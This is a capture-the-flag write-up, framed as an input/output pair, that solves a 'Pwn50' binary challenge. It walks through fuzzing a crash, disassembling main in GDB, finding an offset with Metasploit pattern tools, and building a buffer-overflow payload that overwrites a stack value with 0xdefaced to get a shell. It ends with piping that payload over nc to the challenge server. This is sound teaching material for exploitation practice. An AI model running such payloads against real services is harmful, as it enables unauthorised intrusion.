## input
You look new here
so this is my gift for you
task : nc 54.153.19.139 5251
just write something when connect , its always UP

## output
We try to input a lot of char locally on the [binary](https://github.com/mhackgyver-squad/mhackgyver/blob/master/writeup/attachment/pwn50.zip):

```
~/Documents/challenge/CTF/Bugs\_Bunny/Pwn50$ ./pwn50 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Erreur de segmentation (core dumped)
```

So we open the binary in GDB:

```
~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ gdb ./pwn50 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...

warning: ~/.gdbinit.local: Aucun fichier ou dossier de ce type
Reading symbols from ./pwn50...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000400646 <+0>:	push   rbp
   0x0000000000400647 <+1>:	mov    rbp,rsp
   0x000000000040064a <+4>:	push   rbx
   0x000000000040064b <+5>:	sub    rsp,0x38
   0x000000000040064f <+9>:	mov    DWORD PTR [rbp-0x34],edi
   0x0000000000400652 <+12>:	mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000400656 <+16>:	mov    QWORD PTR [rbp-0x18],0x0
   0x000000000040065e <+24>:	lea    rax,[rbp-0x30]
   0x0000000000400662 <+28>:	mov    rdi,rax
   0x0000000000400665 <+31>:	mov    eax,0x0
   0x000000000040066a <+36>:	call   0x400520 <gets@plt>
   0x000000000040066f <+41>:	movzx  eax,BYTE PTR [rbp-0x30]
   0x0000000000400673 <+45>:	cmp    al,0x62
   0x0000000000400675 <+47>:	jne    0x4006ce <main+136>
   0x0000000000400677 <+49>:	movzx  eax,BYTE PTR [rbp-0x2f]
   0x000000000040067b <+53>:	cmp    al,0x75
   0x000000000040067d <+55>:	jne    0x4006ce <main+136>
   0x000000000040067f <+57>:	movzx  eax,BYTE PTR [rbp-0x2e]
   0x0000000000400683 <+61>:	cmp    al,0x67
   0x0000000000400685 <+63>:	jne    0x4006ce <main+136>
   0x0000000000400687 <+65>:	cmp    QWORD PTR [rbp-0x18],0xdefaced
   0x000000000040068f <+73>:	jne    0x4006ce <main+136>
   0x0000000000400691 <+75>:	mov    edi,0x400764
   0x0000000000400696 <+80>:	call   0x4004e0 <puts@plt>
   0x000000000040069b <+85>:	mov    eax,0x0
   0x00000000004006a0 <+90>:	call   0x400500 <geteuid@plt>
   0x00000000004006a5 <+95>:	mov    ebx,eax
   0x00000000004006a7 <+97>:	mov    eax,0x0
   0x00000000004006ac <+102>:	call   0x400500 <geteuid@plt>
   0x00000000004006b1 <+107>:	mov    esi,ebx
   0x00000000004006b3 <+109>:	mov    edi,eax
   0x00000000004006b5 <+111>:	mov    eax,0x0
   0x00000000004006ba <+116>:	call   0x400530 <setreuid@plt>
   0x00000000004006bf <+121>:	mov    edi,0x400773
   0x00000000004006c4 <+126>:	mov    eax,0x0
   0x00000000004006c9 <+131>:	call   0x4004f0 <system@plt>
   0x00000000004006ce <+136>:	mov    eax,0x0
   0x00000000004006d3 <+141>:	add    rsp,0x38
   0x00000000004006d7 <+145>:	pop    rbx
   0x00000000004006d8 <+146>:	pop    rbp
   0x00000000004006d9 <+147>:	ret    
End of assembler dump.
```

We remark that there are 3 cmp *al* versus *0x62 0x75 0x67*, which in ASCII world means bug. Then we look which are the char of the overflow that are compared to *0xdefaced*.

First we generate a pattern:
```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
```

Then we use the pattern as input after the *bug* string:
```
gdb-peda$ b * 0x0000000000400687
Breakpoint 1 at 0x400687
gdb-peda$ r
Starting program: /home/tenflo/Documents/challenge/CTF/Bugs_Bunny/Pwn50/pwn50 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
bugAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab










[----------------------------------registers-----------------------------------]
RAX: 0x67 ('g')
RBX: 0x0 
RCX: 0x7ffff7dd18e0 --> 0xfbad2288 
RDX: 0x7ffff7dd3790 --> 0x0 
RSI: 0x602045 --> 0xa ('\n')
RDI: 0x7fffffffdcf5 --> 0xfff7a2d830000000 
RBP: 0x7fffffffdcf0 --> 0x6241356241 ('Ab5Ab')
RSP: 0x7fffffffdcb0 --> 0x7fffffffddd8 --> 0x7fffffffe161 ("/home/tenflo/Documents/challenge/CTF/Bugs_Bunny/Pwn50/pwn50")
RIP: 0x400687 (<main+65>:	cmp    QWORD PTR [rbp-0x18],0xdefaced)
R8 : 0x602046 --> 0x0 
R9 : 0x6141386141376141 ('Aa7Aa8Aa')
R10: 0x4131624130624139 ('9Ab0Ab1A')
R11: 0x246 
R12: 0x400550 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffddd0 --> 0x2 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40067f <main+57>:	movzx  eax,BYTE PTR [rbp-0x2e]
   0x400683 <main+61>:	cmp    al,0x67
   0x400685 <main+63>:	jne    0x4006ce <main+136>
=> 0x400687 <main+65>:	cmp    QWORD PTR [rbp-0x18],0xdefaced
   0x40068f <main+73>:	jne    0x4006ce <main+136>
   0x400691 <main+75>:	mov    edi,0x400764
   0x400696 <main+80>:	call   0x4004e0 <puts@plt>
   0x40069b <main+85>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdcb0 --> 0x7fffffffddd8 --> 0x7fffffffe161 ("/home/tenflo/Documents/challenge/CTF/Bugs_Bunny/Pwn50/pwn50")
0008| 0x7fffffffdcb8 --> 0x20040072d 
0016| 0x7fffffffdcc0 ("bugAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab")
0024| 0x7fffffffdcc8 ("1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab")
0032| 0x7fffffffdcd0 ("a4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab")
0040| 0x7fffffffdcd8 ("Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab")
0048| 0x7fffffffdce0 ("9Ab0Ab1Ab2Ab3Ab4Ab5Ab")
0056| 0x7fffffffdce8 ("b2Ab3Ab4Ab5Ab")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400687 in main ()
gdb-peda$ x/xw $rbp-0x18
0x7fffffffdcd8:	0x41376141
```

Then we use pattern\_offset to know the offset that is compared to *0xdefaced*:
```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 50 -q 0x41376141
[*] Exact match at offset 21
```

We test locally if it's the right solution:
```
~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ python -c "print 'bug'+'A'*21+'\xed\xac\xef\x0d'" > input.hex
~/Documents/challenge/CTF/Bugs_Bunny/Pwn50$ (cat input.hex ; cat) | ./pwn50 
Cool Stuff :p!
whoami
tenflo
```

So we can have our shell on the server with:
```
(cat input.hex ; cat ) | nc 54.153.19.139 5251
```

